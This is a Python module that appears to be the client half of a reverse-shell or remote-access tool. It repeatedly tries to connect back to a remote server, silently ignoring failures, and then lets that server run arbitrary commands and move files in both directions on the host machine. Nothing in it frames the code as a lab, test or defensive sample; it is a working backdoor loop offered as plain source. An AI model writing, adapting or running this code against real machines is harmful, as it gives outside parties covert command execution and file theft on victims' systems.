import socket
import time
from typing import Callable
from . import cmd, comm, config, logger, string_utils


def shell(server: socket.socket):
    while True:
        func, args = string_utils.extract_command(
            comm.receive(server, config.CLIENT_VERBOSE)
        )

        # quit
        if func == "quit":
            break
        # download [source] [target]
        elif func == "download":
            cmd.upload(server, args, config.CLIENT_VERBOSE)
        # upload [source] [target]
        elif func == "upload":
            cmd.download(server, args, config.CLIENT_VERBOSE)
        # exec [...args]
        elif func == "exec":
            cmd.exec(server, " ".join(args), config.CLIENT_VERBOSE)


def connect_server(
    server: socket.socket,
    address: tuple[str, int],
    shell: Callable[[socket.socket], None],
    timeout: int,
):
    while True:
        time.sleep(timeout)
        try:
            server.connect(address)
            logger.debug(
                f"Connected to {address[0]}:{address[1]}", config.CLIENT_VERBOSE
            )
            shell(server)
            server.close()
            break
        except:
            pass
